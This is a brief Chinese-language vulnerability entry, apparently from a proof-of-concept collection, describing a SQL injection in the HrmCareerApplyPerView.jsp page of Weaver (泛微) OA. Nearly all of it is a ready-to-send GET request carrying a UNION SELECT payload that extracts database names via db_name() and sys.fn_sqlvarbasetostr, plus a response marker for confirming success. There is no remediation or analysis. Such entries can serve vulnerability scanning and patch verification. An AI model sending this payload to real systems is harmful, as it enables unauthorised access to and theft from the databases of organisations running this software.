# 泛微HrmCareerApplyPerViewSQL注入漏洞

泛微OA ｜ SQL注入 ｜ —
- **请求**：`GET /pweb/careerapply/HrmCareerApplyPerView.jsp?id=1%20union%20select%201,2,sys.fn_sqlvarbasetostr(db_name()),db_name(1),5,6,7 HTTP/1.1`
- **响应特征**：-1